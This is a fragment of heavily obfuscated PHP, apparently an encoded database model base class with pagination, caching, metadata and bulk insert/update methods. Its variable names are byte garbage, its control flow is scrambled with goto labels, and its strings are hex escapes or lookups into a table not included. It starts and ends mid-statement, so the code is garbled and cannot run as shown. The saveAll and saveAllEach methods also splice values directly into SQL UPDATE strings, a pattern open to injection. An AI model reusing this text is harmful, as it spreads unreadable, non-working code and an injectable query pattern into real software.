bªğê¡Ôã¯: @flock($c‹ô­»ŞÀ¼[$F–À³ï»Ò[853]], LOCK_UN); @fclose($c‹ô­»ŞÀ¼[$F–À³ï»Ò[853]]); @unlink($c‹ô­»ŞÀ¼[$F–À³ï»Ò[193]]); goto dèº¬±º; e±ÃßñšÉ: } } goto d´ŒÒ‹›Üğ; Eêñ ï‚ø: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\171\124\x69\155\145", "\164\x69\155\x65", "\x69\156\163\145\162\164\54\x75\160\144\x61\164\x65", "\146\x75\x6e\x63\x74\x69\x6f\x6e"), array("\x63\x72\145\141\x74\145\124\x69\155\145", "\x74\151\x6d\145", "\x69\x6e\x73\x65\162\164", "\x66\165\156\143\x74\151\x6f\156")); public function setDataAuto($b«·šº÷Ò„) { $this->dataAuto = $b«·šº÷Ò„; } public function __construct($DñˆéäÄ÷ù = '', $DŞãğéÔ‘é = '', $Fã®¢È¡ê­ = '') { parent::__construct($DñˆéäÄ÷ù, $DŞãğéÔ‘é, $Fã®¢È¡ê­); } protected $tableMeta = array(); protected function _beforeInsert(&$F†ÛĞ‚ÅÖõ, $F®•–’ì£ç) { $E‰óİæã¶ =& $_SERVER[›èö’ù¤]; if (!$this->checkDataAutoHas($E‰óİæã¶[353])) { return; } $this->dataBeforeFilter($F†ÛĞ‚ÅÖõ, $E‰óİæã¶[353]); } protected function _beforeUpdate(&$E˜ÚÅ‘¹×², $AÑ´‘ğ÷é) { $E”¯ğÖ…š† =& $_SERVER[›èö’ù¤]; if (!$this->checkDataAutoHas($E”¯ğÖ…š†[354])) { return; } $this->dataBeforeFilter($E˜ÚÅ‘¹×², $E”¯ğÖ…š†[354]); } protected function _afterSelect(&$a¡›ğ¹ãç, $A†Ğ•œáœ) { if (!is_array($a¡›ğ¹ãç)) { return; } if (!$this->checkDataAutoHas($_SERVER[›èö’ù¤][355])) { return; } foreach ($a¡›ğ¹ãç as &$bŒ™Œ¹‚õŸ) { $this->dataAfterFilter($bŒ™Œ¹‚õŸ); } unset($bŒ™Œ¹‚õŸ); } protected function _afterFind(&$d„‡÷‘ÕÅÍ, $E©ĞØ´Í£²) { if (!is_array($d„‡÷‘ÕÅÍ)) { return; } if (!$this->checkDataAutoHas($_SERVER[›èö’ù¤][355])) { return; } $this->dataAfterFilter($d„‡÷‘ÕÅÍ); } public static function textEncode($bÔĞãÈó) { if (!$bÔĞãÈó) { return $bÔĞãÈó; } $D‰¯¨´ñá = json_encode($bÔĞãÈó); $D‰¯¨´ñá = preg_replace_callback($_SERVER[›èö’ù¤][356], function ($cÀåğ‘Œãİ) { return addslashes($cÀåğ‘Œãİ[0]); }, $D‰¯¨´ñá); return json_decode($D‰¯¨´ñá); } public static function textDecode($b…ƒíêÖö„) { $d‚æÃ¥Å“ =& $_SERVER[›èö’ù¤]; $CŠÄÉ¹°ˆ® = json_encode($b…ƒíêÖö„); $CŠÄÉ¹°ˆ® = preg_replace_callback($d‚æÃ¥Å“[357], function ($CÕºÍâƒôÅ) { return $_SERVER[›èö’ù¤][97]; }, $CŠÄÉ¹°ˆ®); return json_decode($CŠÄÉ¹°ˆ®); } public function setAutoIncrement($E¥´ê£êØ) { $dˆ…«Ï œ = array($this->getPk() => $E¥´ê£êØ); $eÜ–¹®‘¯ = $this->data($dˆ…«Ï œ)->add(); if ($eÜ–¹®‘¯) { $this->delete($eÜ–¹®‘¯); } } public function getAutoIncrement() { $BÔÌ…Ä†Û½ = $this->getTableName(); $bµÕèÀŞÂ† = $this->max($this->getPk()); $C–†Û…ÑÍ = $this->query("\x73\x68\157\167\40\164\x61\142\154\x65\40\163\x74\141\x74\x75\163\x20\x77\x68\x65\162\145\40\x4e\141\155\145\x3d\47{$BÔÌ…Ä†Û½}\47"); $c‰éÂÁ›´ = $C–†Û…ÑÍ[0][$_SERVER[›èö’ù¤][358]]; $aÊˆßã·Á = max($bµÕèÀŞÂ†, $c‰éÂÁ›´); return $aÊˆßã·Á; } protected function _callBefore($bÆõÍİÔª , $aì¨ Ú‹Âä) { return $this->cacheCallCheck($bÆõÍİÔª , $aì¨ Ú‹Âä, !1); } protected function _callAfter($eÜ­“‰ŞØï, $D¡¿œ£”å¹) { return $this->cacheCallCheck($eÜ­“‰ŞØï, $D¡¿œ£”å¹, !0); } protected function cacheFunctionAlias($a´¾æ®Ö) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($eê£Ä•—Õó, $FÙ½¹É­ÇÙ, $DŞÆ­İ¼’ = false) { $EÍ­•£ÍÊó = $this->cacheFunctionAlias($FÙ½¹É­ÇÙ); if (!$EÍ­•£ÍÊó) { return; } foreach ($EÍ­•£ÍÊó as $AÇ‚×Üğ => $D‘ÛßŒŠš’) { $d«³ğ¢„™ = $D‘ÛßŒŠš’[0]; $aÍŒËƒË´ = explode($_SERVER[›èö’ù¤][47], $D‘ÛßŒŠš’[1]); if ($eê£Ä•—Õó == $AÇ‚×Üğ) { return $this->cacheFunctionGet($AÇ‚×Üğ, $d«³ğ¢„™); } if ($DŞÆ­İ¼’ && in_array($eê£Ä•—Õó, $aÍŒËƒË´)) { $this->cacheFunctionClear($AÇ‚×Üğ, $d«³ğ¢„™); } } } public function cacheFunctionGet($Cèçîó´¥Å, $C£Å¯ß‰¹Ó) { $Bîã¤ÙòÍë = $this->cacheKeyMake($Cèçîó´¥Å, $C£Å¯ß‰¹Ó); $e¸õ±ŸÆ´ = Cache::get($Bîã¤ÙòÍë); if (!is_array($e¸õ±ŸÆ´)) { $e¸õ±ŸÆ´ = call_user_func_array(array($this, $Cèçîó´¥Å), array($C£Å¯ß‰¹Ó, !0)); Cache::set($Bîã¤ÙòÍë, $e¸õ±ŸÆ´); } return $e¸õ±ŸÆ´; } public function cacheFunctionClear($b„Å ºá÷Ú, $CïÅÀ½šä³) { $b…Äà‘æå = $CïÅÀ½šä³; if (!is_array($CïÅÀ½šä³)) { $b…Äà‘æå = array($CïÅÀ½šä³); } foreach ($b…Äà‘æå as $EÕÂ¦„¥È) { $eÁß³êä™ = $this->cacheKeyMake($b„Å ºá÷Ú, $EÕÂ¦„¥È); Cache::remove($eÁß³êä™); } } private function cacheKeyMake($eÛ¯Œİã¬©, $dèÚ£÷´˜Œ) { $a°ŒãÍ¦×ù =& $_SERVER[›èö’ù¤]; return get_class($this) . $a°ŒãÍ¦×ù[71] . $eÛ¯Œİã¬© . $a°ŒãÍ¦×ù[359] . $dèÚ£÷´˜Œ; } protected function selectPageReset() { $aÌ ï¾Šˆ„ =& $_SERVER[›èö’ù¤]; if (isset($GLOBALS[$aÌ ï¾Šˆ„[360]])) { return; } $GLOBALS[$aÌ ï¾Šˆ„[360]] = isset($GLOBALS[$aÌ ï¾Šˆ„[7]][$aÌ ï¾Šˆ„[361]]) ? $GLOBALS[$aÌ ï¾Šˆ„[7]][$aÌ ï¾Šˆ„[361]] : !1; $GLOBALS[$aÌ ï¾Šˆ„[362]] = isset($GLOBALS[$aÌ ï¾Šˆ„[7]][$aÌ ï¾Šˆ„[351]]) ? $GLOBALS[$aÌ ï¾Šˆ„[7]][$aÌ ï¾Šˆ„[351]] : !1; $GLOBALS[$aÌ ï¾Šˆ„[7]][$aÌ ï¾Šˆ„[361]] = !1; $GLOBALS[$aÌ ï¾Šˆ„[7]][$aÌ ï¾Šˆ„[351]] = !1; } protected function selectPageRestore() { $b‚Øï”×ñï =& $_SERVER[›èö’ù¤]; if (!isset($GLOBALS[$b‚Øï”×ñï[360]])) { return; } $GLOBALS[$b‚Øï”×ñï[7]][$b‚Øï”×ñï[361]] = $GLOBALS[$b‚Øï”×ñï[360]]; $GLOBALS[$b‚Øï”×ñï[7]][$b‚Øï”×ñï[351]] = $GLOBALS[$b‚Øï”×ñï[362]]; unset($GLOBALS[$b‚Øï”×ñï[360]]); unset($GLOBALS[$b‚Øï”×ñï[362]]); } protected function selectPage($D¶î‚¿ĞÜª = 200, $D…Ò¾ã¯Ñ = 1) { goto aï¦”¦ÑÇ; A…³±®Òè’: $eêÚßŒæ¤ = 50000; $D¶î‚¿ĞÜª = isset($in[$cÍÅô÷Á¬ƒ[361]]) && $in[$cÍÅô÷Á¬ƒ[361]] ? $in[$cÍÅô÷Á¬ƒ[361]] : $D¶î‚¿ĞÜª; if ($D¶î‚¿ĞÜª === -1) { $in[$cÍÅô÷Á¬ƒ[361]] = !1; $eêÚßŒæ¤ = 100000000; $D¶î‚¿ĞÜª = $eêÚßŒæ¤; } goto b‘ƒè×ö…‡; d“»ƒÆÉ“ñ: $D¶î‚¿ĞÜª = $D¶î‚¿ĞÜª <= 5 ? 5 : ($D¶î‚¿ĞÜª >= $eêÚßŒæ¤ ? $eêÚßŒæ¤ : $D¶î‚¿ĞÜª); $D…Ò¾ã¯Ñ = intval(isset($in[$cÍÅô÷Á¬ƒ[351]]) && $in[$cÍÅô÷Á¬ƒ[351]] ? $in[$cÍÅô÷Á¬ƒ[351]] : $D…Ò¾ã¯Ñ); $D…Ò¾ã¯Ñ = $D…Ò¾ã¯Ñ <= 1 ? 1 : $D…Ò¾ã¯Ñ; goto FÒ£íñ¥–ò; FÒ£íñ¥–ò: $C´¢‡¨¤ˆ = array(); $c¬Öç•«Ô = 1; if ($D…Ò¾ã¯Ñ == 1 && $c¬Öç•«Ô) { $this->optionsValue($EÛè«ò²Í); $C´¢‡¨¤ˆ = $this->page($D…Ò¾ã¯Ñ, $D¶î‚¿ĞÜª)->select(); $F’ª°é¢È‹ = is_array($C´¢‡¨¤ˆ) ? count($C´¢‡¨¤ˆ) : 0; if ($F’ª°é¢È‹ < $D¶î‚¿ĞÜª) { $EÄµòÅˆµ = 1; } else { $this->optionsValue($a©Ô‚“Ó¦); $F’ª°é¢È‹ = intval($this->count()); $EÄµòÅˆµ = ceil($F’ª°é¢È‹ / $D¶î‚¿ĞÜª); } } else { $this->optionsValue($a©Ô‚“Ó¦); $F’ª°é¢È‹ = intval($this->count()); $EÄµòÅˆµ = ceil($F’ª°é¢È‹ / $D¶î‚¿ĞÜª); $D…Ò¾ã¯Ñ = $D…Ò¾ã¯Ñ >= $EÄµòÅˆµ ? $EÄµòÅˆµ : $D…Ò¾ã¯Ñ; $this->optionsValue($EÛè«ò²Í); $C´¢‡¨¤ˆ = $this->page($D…Ò¾ã¯Ñ, $D¶î‚¿ĞÜª)->select(); } goto eÎ«¤’×¢; f¬²´èÒ: return $E´¯³Ó®”; goto aŠ¯ù‘òÙñ; b‘ƒè×ö…‡: $a©Ô‚“Ó¦ = $EÛè«ò²Í; $a©Ô‚“Ó¦[$cÍÅô÷Á¬ƒ[363]] = array(); $D¶î‚¿ĞÜª = intval($D¶î‚¿ĞÜª); goto d“»ƒÆÉ“ñ; eÎ«¤’×¢: if (!is_array($C´¢‡¨¤ˆ)) { $C´¢‡¨¤ˆ = array(); } if ($EÄµòÅˆµ == 1) { $F’ª°é¢È‹ = count($C´¢‡¨¤ˆ); } $E´¯³Ó®” = array($cÍÅô÷Á¬ƒ[364] => array($cÍÅô÷Á¬ƒ[365] => $F’ª°é¢È‹, $cÍÅô÷Á¬ƒ[361] => $D¶î‚¿ĞÜª, $cÍÅô÷Á¬ƒ[351] => $D…Ò¾ã¯Ñ, $cÍÅô÷Á¬ƒ[366] => $EÄµòÅˆµ), $cÍÅô÷Á¬ƒ[367] => $C´¢‡¨¤ˆ); goto f¬²´èÒ; aï¦”¦ÑÇ: $cÍÅô÷Á¬ƒ =& $_SERVER[›èö’ù¤]; global $in; $EÛè«ò²Í = $this->optionsValue(); goto A…³±®Òè’; aŠ¯ù‘òÙñ: } protected function checkLength($Aùë‘•«˜, $B±ï·ÍØ©Á = 0, $d¾·¸çÃ‚ = '') { $B±Îœõ¤šÖ =& $_SERVER[›èö’ù¤]; $B±ï·ÍØ©Á = $B±ï·ÍØ©Á ? $B±ï·ÍØ©Á : 65536; if (!$Aùë‘•«˜ || strlen($Aùë‘•«˜) < $B±ï·ÍØ©Á) { return; } $d¾·¸çÃ‚ = $d¾·¸çÃ‚ ? $d¾·¸çÃ‚ . $B±Îœõ¤šÖ[68] : $B±Îœõ¤šÖ[33]; show_json($d¾·¸çÃ‚ . LNG($B±Îœõ¤šÖ[368]) . "\50{$B±ï·ÍØ©Á}\51", !1); } protected function metaSet($BÔ÷´‚’Ñ, $F´§ öí‰Ÿ = null, $d¶Õš¶¼ˆ„ = null) { goto dÛ¤à­èÍØ; dÛ¤à­èÍØ: $c©ğˆ¬‚ŒÌ =& $_SERVER[›èö’ù¤]; if (!$this->tableMeta || !$BÔ÷´‚’Ñ) { return !1; } $cñÙà”¨Æ = $this->tableMeta[$c©ğˆ¬‚ŒÌ[369]]; goto A‰óÁœÁ´‹; A‰óÁœÁ´‹: $bğôˆ¢–è = $this->tableMeta[$c©ğˆ¬‚ŒÌ[370]]; $cÖ¥ÃÛŠ¶› = Model($bğôˆ¢–è); $e¦öØ‹ßì = array($cñÙà”¨Æ => $BÔ÷´‚’Ñ, $c©ğˆ¬‚ŒÌ[371] => $F´§ öí‰Ÿ); goto BÑ¬º“¹áö; b¼£ÚÇÄ…: if (is_string($F´§ öí‰Ÿ)) { $E‰›îà™Ğ†[$F´§ öí‰Ÿ] = $d¶Õš¶¼ˆ„; } $F†ÏéÉª—¬ = array(); foreach ($E‰›îà™Ğ† as $DšØŠ’İ => $FğÄ·) { if (is_null($FğÄ·) && is_string($DšØŠ’İ)) { $cÖ¥ÃÛŠ¶›->where(array($cñÙà”¨Æ => $BÔ÷´‚’Ñ, $c©ğˆ¬‚ŒÌ[371] => $DšØŠ’İ))->delete(); continue; } $this->checkLength($FğÄ·, !1, $bğôˆ¢–è . $c©ğˆ¬‚ŒÌ[4] . $DšØŠ’İ); $F†ÏéÉª—¬[] = array($cñÙà”¨Æ => $BÔ÷´‚’Ñ, $c©ğˆ¬‚ŒÌ[93] => $DšØŠ’İ, $c©ğˆ¬‚ŒÌ[372] => $FğÄ·); } goto D ËàæÄó; BÑ¬º“¹áö: if (is_null($F´§ öí‰Ÿ)) { return $cÖ¥ÃÛŠ¶›->where(array($cñÙà”¨Æ => $BÔ÷´‚’Ñ))->delete(); } if (is_null($d¶Õš¶¼ˆ„) && is_string($F´§ öí‰Ÿ)) { return $cÖ¥ÃÛŠ¶›->where($e¦öØ‹ßì)->delete(); } $E‰›îà™Ğ† = is_array($F´§ öí‰Ÿ) ? $F´§ öí‰Ÿ : array(); goto b¼£ÚÇÄ…; EÁ£×ñÙ³Ü: CacheLock::unlock($F¯‰‰¹ÁÊÕ); return !0; goto E„¸ÀÚÒ‡; D ËàæÄó: $F¯‰‰¹ÁÊÕ = $c©ğˆ¬‚ŒÌ[373] . $this->tableMeta; CacheLock::lock($F¯‰‰¹ÁÊÕ); $cÖ¥ÃÛŠ¶›->where(array($cñÙà”¨Æ => $BÔ÷´‚’Ñ))->addAll($F†ÏéÉª—¬, array(), !0); goto EÁ£×ñÙ³Ü; E„¸ÀÚÒ‡: } public function metaGet($D¸¨µï‰«, $eÕ°õÒõ— = false) { goto dƒšİ·‘Óò; cÔ™†èÃİñ: $dÇøİÕÒÄ¾ = Model($this->tableMeta[$Bœƒô Ûİ[370]]); if ($eÕ°õÒõ—) { $B…Ä¶ñáÜ = array($dÇãÊ‘ÀºŞ => $D¸¨µï‰«, $Bœƒô Ûİ[93] => $eÕ°õÒõ—); return $dÇøİÕÒÄ¾->where($B…Ä¶ñáÜ)->getField($Bœƒô Ûİ[372]); } $B…Ä¶ñáÜ = array($dÇãÊ‘ÀºŞ => $D¸¨µï‰«); goto d„‘Ê¸—Ë; dƒšİ·‘Óò: $Bœƒô Ûİ =& $_SERVER[›èö’ù¤]; if (!$this->tableMeta) { return array(); } $dÇãÊ‘ÀºŞ = $this->tableMeta[$Bœƒô Ûİ[369]]; goto cÔ™†èÃİñ; d„‘Ê¸—Ë: $A“ƒÈÏ¥Ü· = $dÇøİÕÒÄ¾->field($Bœƒô Ûİ[374])->where($B…Ä¶ñáÜ)->select(); $A“ƒÈÏ¥Ü· = array_to_keyvalue($A“ƒÈÏ¥Ü·, $Bœƒô Ûİ[93], $Bœƒô Ûİ[372]); return $A“ƒÈÏ¥Ü·; goto B—ƒôĞŒ—; B—ƒôĞŒ—: } private function checkDataAutoHas($DæÛóòğ½á) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $A—Ú¶×…è±) { if (in_array($DæÛóòğ½á, explode($_SERVER[›èö’ù¤][47], $A—Ú¶×…è±[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$b‹Å‰ùÙÎç, $e»Æì‰¸) { $e‡ƒíÉ¢Ÿº =& $_SERVER[›èö’ù¤]; foreach ($this->dataAuto as $Dó­¹¹Š) { $aã½Ø†§³Ø = $Dó­¹¹Š[0]; if (!in_array($e»Æì‰¸, explode($e‡ƒíÉ¢Ÿº[47], $Dó­¹¹Š[2]))) { continue; } switch (trim($Dó­¹¹Š[3])) { case $e‡ƒíÉ¢Ÿº[319]: case $e‡ƒíÉ¢Ÿº[320]: $d„ø½“§ = $Dó­¹¹Š[1]; $A¾ÜØóóÅ = isset($Dó­¹¹Š[4]) ? (array) $Dó­¹¹Š[4] : array(); if ($d„ø½“§ == $e‡ƒíÉ¢Ÿº[197] && array_key_exists($aã½Ø†§³Ø, $b‹Å‰ùÙÎç)) { if (!$b‹Å‰ùÙÎç[$aã½Ø†§³Ø]) { unset($b‹Å‰ùÙÎç[$aã½Ø†§³Ø]); } break; } if (isset($b‹Å‰ùÙÎç[$aã½Ø†§³Ø])) { array_unshift($A¾ÜØóóÅ, $b‹Å‰ùÙÎç[$aã½Ø†§³Ø]); } if ($e‡ƒíÉ¢Ÿº[319] == $Dó­¹¹Š[3]) { $b‹Å‰ùÙÎç[$aã½Ø†§³Ø] = call_user_func_array($d„ø½“§, $A¾ÜØóóÅ); } else { $b‹Å‰ùÙÎç[$aã½Ø†§³Ø] = call_user_func_array(array(&$this, $d„ø½“§), $A¾ÜØóóÅ); } break; case $e‡ƒíÉ¢Ÿº[268]: if (isset($b‹Å‰ùÙÎç[$aã½Ø†§³Ø]) && $b‹Å‰ùÙÎç[$aã½Ø†§³Ø]) { $b‹Å‰ùÙÎç[$aã½Ø†§³Ø] = call_user_func_array(array(&$this, $Dó­¹¹Š[1]), array($b‹Å‰ùÙÎç[$aã½Ø†§³Ø])); } break; case $e‡ƒíÉ¢Ÿº[271]: $b‹Å‰ùÙÎç[$aã½Ø†§³Ø] = $b‹Å‰ùÙÎç[$Dó­¹¹Š[1]]; break; case $e‡ƒíÉ¢Ÿº[292]: if (isset($b‹Å‰ùÙÎç[$aã½Ø†§³Ø]) && !is_string($b‹Å‰ùÙÎç[$aã½Ø†§³Ø])) { $b‹Å‰ùÙÎç[$aã½Ø†§³Ø] = json_encode_force($b‹Å‰ùÙÎç[$aã½Ø†§³Ø]); } break; case $e‡ƒíÉ¢Ÿº[321]: if ($b‹Å‰ùÙÎç[$aã½Ø†§³Ø] === $e‡ƒíÉ¢Ÿº[33]) { unset($b‹Å‰ùÙÎç[$aã½Ø†§³Ø]); } break; case $e‡ƒíÉ¢Ÿº[322]: $b‹Å‰ùÙÎç[$aã½Ø†§³Ø] = $Dó­¹¹Š[1]; default: break; } } if ($e»Æì‰¸ == $e‡ƒíÉ¢Ÿº[353]) { $bïÃÓ•×•ˆ = strtolower($this->db->getDbType()); if (strpos($bïÃÓ•×•ˆ, $e‡ƒíÉ¢Ÿº[9]) !== 0) { return; } $Eˆ‚Æ¸±Ó³ = $this->field(!0)->fields; $c¹İÁÔÔ« = $Eˆ‚Æ¸±Ó³[$e‡ƒíÉ¢Ÿº[250]]; if (isset($Eˆ‚Æ¸±Ó³[$e‡ƒíÉ¢Ÿº[249]])) { unset($c¹İÁÔÔ«[$Eˆ‚Æ¸±Ó³[$e‡ƒíÉ¢Ÿº[249]]]); } foreach ($c¹İÁÔÔ« as $BÍß•ˆÒŒ± => $e»Æì‰¸) { if (!isset($b‹Å‰ùÙÎç[$BÍß•ˆÒŒ±])) { $b‹Å‰ùÙÎç[$BÍß•ˆÒŒ±] = $e‡ƒíÉ¢Ÿº[33]; } } } } private function dataAfterFilter(&$BŠã”îÓÑ±) { $f…àÕêĞù =& $_SERVER[›èö’ù¤]; foreach ($this->dataAuto as $FºáéèŒ¦Æ) { $Aˆœ¨õ—éµ = $FºáéèŒ¦Æ[0]; if (!isset($BŠã”îÓÑ±[$Aˆœ¨õ—éµ])) { continue; } if (!in_array($f…àÕêĞù[355], explode($f…àÕêĞù[47], $FºáéèŒ¦Æ[2]))) { continue; } switch (trim($FºáéèŒ¦Æ[3])) { case $f…àÕêĞù[319]: case $f…àÕêĞù[320]: $Aèõ¹‹«‹ = isset($FºáéèŒ¦Æ[4]) ? (array) $FºáéèŒ¦Æ[4] : array(); array_unshift($Aèõ¹‹«‹, $BŠã”îÓÑ±[$Aˆœ¨õ—éµ]); if (isset($FºáéèŒ¦Æ[4]) && $FºáéèŒ¦Æ[4] == $f…àÕêĞù[375]) { $Aèõ¹‹«‹ = array($BŠã”îÓÑ±[$Aˆœ¨õ—éµ]); } if ($f…àÕêĞù[319] == $FºáéèŒ¦Æ[3]) { $BŠã”îÓÑ±[$Aˆœ¨õ—éµ] = call_user_func_array($FºáéèŒ¦Æ[1], $Aèõ¹‹«‹); } else { $BŠã”îÓÑ±[$Aˆœ¨õ—éµ] = call_user_func_array(array(&$this, $FºáéèŒ¦Æ[1]), $Aèõ¹‹«‹); } break; case $f…àÕêĞù[268]: if (isset($BŠã”îÓÑ±[$Aˆœ¨õ—éµ]) && $BŠã”îÓÑ±[$Aˆœ¨õ—éµ]) { $BŠã”îÓÑ±[$Aˆœ¨õ—éµ] = call_user_func_array(array(&$this, $FºáéèŒ¦Æ[1]), array($BŠã”îÓÑ±[$Aˆœ¨õ—éµ])); } break; case $f…àÕêĞù[271]: $BŠã”îÓÑ±[$Aˆœ¨õ—éµ] = $BŠã”îÓÑ±[$FºáéèŒ¦Æ[1]]; break; case $f…àÕêĞù[292]: $eªñ®† Ú = $BŠã”îÓÑ±[$Aˆœ¨õ—éµ]; $BŠã”îÓÑ±[$Aˆœ¨õ—éµ] = json_decode($eªñ®† Ú, !0); if (is_null($BŠã”îÓÑ±[$Aˆœ¨õ—éµ])) { $BŠã”îÓÑ±[$Aˆœ¨õ—éµ] = $eªñ®† Ú; } break; case $f…àÕêĞù[321]: if ($BŠã”îÓÑ±[$Aˆœ¨õ—éµ] === $f…àÕêĞù[33]) { unset($BŠã”îÓÑ±[$Aˆœ¨õ—éµ]); } break; case $f…àÕêĞù[322]: $BŠã”îÓÑ±[$Aˆœ¨õ—éµ] = $FºáéèŒ¦Æ[1]; break; default: break; } } } public function saveAll($d¿ÌÍ‚‹Ó) { goto CãÌØÍÒÁƒ; DÀÀİ¼ßò: $d¿ÌÍ‚‹Ó = is_array($d¿ÌÍ‚‹Ó) ? $d¿ÌÍ‚‹Ó : array(); $Eòù¯Ú½° = $B•ò‘âÜÈ“[376]; $b×ªÕÄÇÍ = 0; goto cÖŸØªğñƒ; CãÌØÍÒÁƒ: $B•ò‘âÜÈ“ =& $_SERVER[›èö’ù¤]; $F†ÁÈ–ÛŒ× = $this->tablePrefix . $this->tableName; $eçÃÂŒ‰éæ = self::SQL_WHERE_IN_CHUNK; goto DÀÀİ¼ßò; cÖŸØªğñƒ: $AÚ³ù…Ç¢È = array(); $bì×åŞ‚é = count($d¿ÌÍ‚‹Ó); for ($e±ÒÑÙ¹¸Î = 0; $e±ÒÑÙ¹¸Î < $bì×åŞ‚é; $e±ÒÑÙ¹¸Î++) { $aÇãùÅÌŒÍ = $d¿ÌÍ‚‹Ó[$e±ÒÑÙ¹¸Î]; if (!is_array($aÇãùÅÌŒÍ) || count($aÇãùÅÌŒÍ) != 4) { continue; } $E´ÏÈ£É  = "\x55\120\104\101\124\105\x20\x60{$F†ÁÈ–ÛŒ×}\140\x20\x53\105\x54\40{$aÇãùÅÌŒÍ[2]}\40\x3d\40\x43\101\x53\x45\40{$aÇãùÅÌŒÍ[0]}\x20\xa"; if ($b×ªÕÄÇÍ == 0) { $Eòù¯Ú½° = $E´ÏÈ£É ; } $AÚ³ù…Ç¢È[] = $B•ò‘âÜÈ“[116] . $aÇãùÅÌŒÍ[1] . $B•ò‘âÜÈ“[116]; $b×ªÕÄÇÍ++; $Eòù¯Ú½° .= "\x20\127\x48\x45\116\x20\x27{$aÇãùÅÌŒÍ[1]}\47\40\x54\x48\x45\116\40\x27{$aÇãùÅÌŒÍ[3]}\47\x20\12"; if ($b×ªÕÄÇÍ == $eçÃÂŒ‰éæ || $e±ÒÑÙ¹¸Î == $bì×åŞ‚é - 1) { goto c‡å…®ÁÎÕ; c‡å…®ÁÎÕ: $Fõ³Õ¬”¼Ğ = implode($B•ò‘âÜÈ“[47], $AÚ³ù…Ç¢È); $Eòù¯Ú½° .= "\x20\105\116\104\x20\40\127\110\105\122\x45\x20{$aÇãùÅÌŒÍ[0]}\40\x49\x4e\40\x28{$Fõ³Õ¬”¼Ğ}\51\40"; $this->execute($Eòù¯Ú½°); goto cè»ƒ®„Çƒ; cè»ƒ®„Çƒ: $b×ªÕÄÇÍ = 0; $Eòù¯Ú½° = $E´ÏÈ£É ; $this->chunkEventCheck(count($AÚ³ù…Ç¢È)); goto DŠ †Ç„¡±; DŠ †Ç„¡±: $AÚ³ù…Ç¢È = array(); goto aÈ“î×´Â¶; aÈ“î×´Â¶: } } goto C©ø‡ØƒªÑ; C©ø‡ØƒªÑ: $this->chunkEventSet(); goto dŸˆŸ‹œÒ; dŸˆŸ‹œÒ: } public function saveAllEach($eëÂàÕ“‡¢) { $FàæŞ·Ÿ¯Ì =& $_SERVER[›èö’ù¤]; $Fœ¦èš¢Î¿ = $this->tablePrefix . $this->tableName; foreach ($eëÂàÕ“‡¢ as $FÑæç÷Ø·ğ) { if (!is_array($FÑæç÷Ø·ğ) || count($FÑæç÷Ø·ğ) != 4) { continue; } $eö…ğ¾å×¡ = $FÑæç÷Ø·ğ[0] . $FàæŞ·Ÿ¯Ì[377] . $FÑæç÷Ø·ğ[1] . $FàæŞ·Ÿ¯Ì[116]; $Bç‰ª³ºÈí = $FÑæç÷Ø·ğ[2] . $FàæŞ·Ÿ¯Ì[377] . $FÑæç÷Ø·ğ[3] . $FàæŞ·Ÿ¯Ì[116]; $D§îÎ¸Ç“ = "\165\160\144\141\x74\x65\x20{$Fœ¦èš¢Î¿}\40\163\x65\164\x20{$Bç‰ª³ºÈí}\x20\167\150\x65\x72\145\40{$eö…ğ¾å×¡}\x3b"; $this->execute($D§îÎ¸Ç“); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($AïÊÊçíà = false, $Aù±·§¾Öã = false) { $this->_chunkEvent = $AïÊÊçíà; $this->_chunkEventParam = $Aù±·§¾Öã; } private function chunkEventCheck($Cœ˜¿ÙÆºª) { if (!$this->_chunkEvent) { return; } $DÆ¶ğğğñ± = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $DÆ¶ğğğñ±[$_SERVER[›èö’ù¤][378]] = $Cœ˜¿ÙÆºª; Hook::trigger($this->_chunkEvent, $DÆ¶ğğğñ±); } public function addAll($dŠÍÏÂË»õ, $d©ôÉáğ¸÷ = array(), $e·ÔŒßÃ÷” = false) { goto F‚‡Ïğ‹£; F‚‡Ïğ‹£: $A¨Ã²ÌŠÎ² =& $_SERVER[›èö’ù¤]; ignore_timeout(); $dÖÏÀ·°Í½ = self::SQL_WHERE_IN_CHUNK; goto AÔéâŞˆª; f¯ïÍ§›Í: if (method_exists($this->db, $A¨Ã²ÌŠÎ²[270])) { for ($a†®ËøŞãŠ = 0; $a†®ËøŞãŠ < count($dŠÍÏÂË»õ); $a†®ËøŞãŠ += $dÖÏÀ·°Í½) { $DŒ”ö˜ôã¾ = array_slice($dŠÍÏÂË»õ, $a†®ËøŞãŠ, $dÖÏÀ·°Í½); if (!is_array($DŒ”ö˜ôã¾) || count($DŒ”ö˜ôã¾) == 0) { break; } $fñ”¿Ï†‹Æ = $this->db->insertAll($DŒ”ö˜ôã¾, $d©ôÉáğ¸÷, $e·ÔŒßÃ÷”); $this->chunkEventCheck(count($DŒ”ö˜ôã¾)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($dŠÍÏÂË»õ as $Fö‡º°ôáµ => $dÖê‡…Ò—ˆ) { $fñ”¿Ï†‹Æ = $this->db->insert($dÖê‡…Ò—ˆ, $d©ôÉáğ¸÷, $e·ÔŒßÃ÷”); } $this->commit(); } if (!1 !== $fñ”¿Ï†‹Æ) { $B‡óå¢êˆÇ = $this->getLastInsID(); if ($B‡óå¢êˆÇ) { return $B‡óå¢êˆÇ; } } return $fñ”¿Ï†‹Æ; goto bêä«¡‘ ›; AÔéâŞˆª: if (empty($dŠÍÏÂË»õ)) { $this->error = think_lang($A¨Ã²ÌŠÎ²[269]); return !1; } $d©ôÉáğ¸÷ = $this->_parseOptions($d©ôÉáğ¸÷); foreach ($dŠÍÏÂË»õ as $Fö‡º°ôáµ => $dÖê‡…Ò—ˆ) { $dŠÍÏÂË»õ[$Fö‡º°ôáµ] = $this->_facade($dÖê‡…Ò—ˆ); $this->_beforeInsert($dŠÍÏÂË»õ[$Fö‡º°ôáµ], $d©ôÉáğ¸÷); } goto f¯ïÍ§›Í; bêä«¡‘ ›: } public function save($E©†Á–ß’Ï = '', $e˜­¬­ŸøŞ = array()) { goto b³¤â‚çäÉ; f„” £²ŠÉ: $CßÛºøÏĞ¤ = $Eã…æÂï–í[$B†Ì–“Ü[273]][$aÀĞñêØ¾Š][1]; 